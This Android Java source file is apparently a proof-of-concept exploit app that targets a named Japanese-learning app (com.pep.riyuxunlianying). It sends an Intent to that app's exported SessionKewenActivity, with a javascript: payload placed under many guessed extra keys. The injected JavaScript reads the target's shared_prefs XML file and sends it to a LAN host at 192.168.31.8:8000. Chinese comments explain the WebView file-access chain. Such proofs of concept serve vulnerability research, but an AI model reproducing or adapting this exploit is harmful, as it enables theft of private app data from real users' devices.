package com.example.attacker;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button btn = findViewById(R.id.btn_launch);
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                launchAttack();
            }
        });
    }

    private void launchAttack() {
        try {
            // 目标组件
            ComponentName target = new ComponentName("com.pep.riyuxunlianying", "com.pep.riyuxunlianying.activity.SessionKewenActivity");
            
            Intent intent = new Intent();
            intent.setComponent(target);
            
            // 构造恶意 Payload (XSS -> File Theft)
            // 使用 javascript: 伪协议，因为 WebView.loadUrl() 通常不直接接受 HTML 字符串
            // 压缩 JS 代码以避免换行问题
            String jsCode = "var xhr=new XMLHttpRequest();" +
                            "xhr.open('GET','file:///data/data/com.pep.riyuxunlianying/shared_prefs/CobubRazor_SharedPref.xml',false);" +
                            "xhr.send(null);" +
                            "new Image().src='http://192.168.31.8:8000/?data='+encodeURIComponent(xhr.responseText);";
            
            String payload = "javascript:" + jsCode;

            // 模拟 SessionKewen 对象结构
            // 尝试多种常见的 Intent Extra Key，以防猜错
            intent.putExtra("url", payload);
            intent.putExtra("target_url", payload);
            intent.putExtra("web_url", payload);
            intent.putExtra("link", payload);
            intent.putExtra("data", payload);
            intent.putExtra("contents", payload);
            // 添加之前注释中提到的关键 Key
            intent.putExtra("extra_session_kewen", payload);
            intent.putExtra("session_kewen", payload);
            intent.putExtra("kewen", payload);
            intent.putExtra("session", payload);
            intent.putExtra("bean", payload);
            intent.putExtra("entity", payload);
            intent.putExtra("info", payload);
            
            // 如果目标 Activity 只是简单的 loadUrl(intent.getStringExtra("..."))
            // 那么 javascript: 协议将会在当前 WebView 上下文中执行 JS。
            // 如果 WebView 开启了 allowUniversalAccessFromFileURLs，我们就能读取本地文件。
            
            startActivity(intent);
            Log.d("Attacker", "Attack Intent sent!");
            Toast.makeText(this, "Attack Sent!", Toast.LENGTH_SHORT).show();
            
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "Attack Failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
}